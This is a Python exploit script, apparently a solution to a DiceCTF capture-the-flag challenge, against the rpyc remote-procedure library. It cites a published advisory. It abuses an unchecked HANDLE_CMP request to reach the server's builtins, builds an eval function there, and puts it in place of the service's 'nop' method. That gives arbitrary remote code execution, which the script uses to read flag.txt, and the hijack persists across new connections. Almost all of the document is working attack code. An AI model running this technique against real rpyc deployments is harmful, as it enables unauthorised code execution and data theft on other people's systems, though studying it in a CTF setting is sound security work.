# socat tcp-listen:1337,fork,reuseaddr openssl:pike-90e229bcd70e2f49.mc.ax:1

# https://github.com/tomerfiliba-org/rpyc/security/advisories/GHSA-pj4g-4488-wmxm

import rpyc, logging

PORT = 1337
IP = "localhost"

def myeval(self=None, cmd="__import__('sys')"):
    return eval(cmd)


def get_code(obj_codetype, func, filename=None, name=None):
    func_code = func.__code__
    arg_names = ['co_argcount', 'co_posonlyargcount', 'co_kwonlyargcount', 'co_nlocals', 'co_stacksize', 'co_flags',
                 'co_code', 'co_consts', 'co_names', 'co_varnames', 'co_filename', 'co_name', 'co_firstlineno',
                 'co_lnotab', 'co_freevars', 'co_cellvars']

    codetype_args = {(i, n): getattr(func_code, n) for i, n in enumerate(arg_names)}
    print(codetype_args)
    codetype_args = list(codetype_args.values())
    if filename:
        codetype_args[arg_names.index('co_filename')] = filename
    if name:
        codetype_args[arg_names.index('co_name')] = name
    mycode = obj_codetype(*codetype_args)
    return mycode

class Exploit():
    def __init__(self):
        self.logger = logging.getLogger('rpyc')
        self.logger.setLevel(logging.DEBUG)  # NOTSET only traverses until another level is found, so DEBUG is preferred
        self.conn = rpyc.connect(IP, PORT)

    def quit(self):
        self.conn.close()

    def netref_getattr(self, netref, attrname):
        # PoC CWE-358: abuse __cmp__ function that was missing a security check
        handler = rpyc.core.consts.HANDLE_CMP
        return self.conn.sync_request(handler, netref, attrname, '__getattribute__')

    def exploit1_modify_nop(self):
        # create netrefs for builtins and globals that will be used to construct on remote
        remote_svc_proto = self.netref_getattr(self.conn.root, '_protocol')
        remote_dispatch = self.netref_getattr(remote_svc_proto, '_dispatch_request')
        remote_class_globals = self.netref_getattr(remote_dispatch, '__globals__')
        remote_modules = self.netref_getattr(remote_class_globals['sys'], 'modules')
        _builtins = remote_modules['builtins']
        remote_builtins = {k: self.netref_getattr(_builtins, k) for k in dir(_builtins)}

        # populate globals for CodeType calls on remote
        remote_globals = remote_builtins['dict']()
        for name, netref in remote_builtins.items():
            remote_globals[name] = netref
        for name, netref in self.netref_getattr(remote_modules, 'items')():
            remote_globals[name] = netref

        # create netrefs for types to create remote function malicously
        remote_types = remote_builtins['__import__']("types")
        remote_types_CodeType = self.netref_getattr(remote_types, 'CodeType')
        remote_types_FunctionType = self.netref_getattr(remote_types, 'FunctionType')

        # remote eval function constructed
        remote_eval_codeobj = get_code(remote_types_CodeType, myeval, filename='test_code.py', name='__code__')
        remote_eval = remote_types_FunctionType(remote_eval_codeobj, remote_globals)
        # PoC CWE-913: modify the exposed_nop of service
        #   by binding various netrefs in this execution frame, they are cached in
        #   the remote address space. setattr and eval functions are cached for the life
        #   of the netrefs in the frame. A consequence of Netref classes inheriting
        #   BaseNetref, each object is cached under_local_objects. So, we are able
        #   to construct arbitrary code using types and builtins.

        # use the builtin netrefs to modify the service to use the constructed eval func
        remote_setattr = remote_builtins['setattr']
        remote_type = remote_builtins['type']
        remote_setattr(remote_type(self.conn.root), 'exposed_nop', remote_eval)

        # show that nop was replaced by eval to complete the PoC
        remote_sys = self.conn.root.nop('__import__("sys")')
        remote_stack = self.conn.root.nop('"".join(__import__("traceback").format_stack())')
        remote_code_execution = self.conn.root.nop('open("flag.txt").read()')
        print(remote_code_execution)

    def exploit2_new_conn_impacted(self):
        # demostrate impact and scope of vuln for new connections
        self.conn.close()
        self.conn = rpyc.connect(IP, PORT)
        # show new conn can still use nop as eval
        remote_sys = self.conn.root.nop('__import__("sys")')
        remote_stack = self.conn.root.nop('"".join(__import__("traceback").format_stack())')
        remote_code_execution = self.conn.root.nop('open("flag.txt").read()')
        print(remote_code_execution)

exploit = Exploit()
exploit.exploit1_modify_nop()
exploit.exploit2_new_conn_impacted()
exploit.quit()

# dice{pyj41l_w1th_4_tw15t}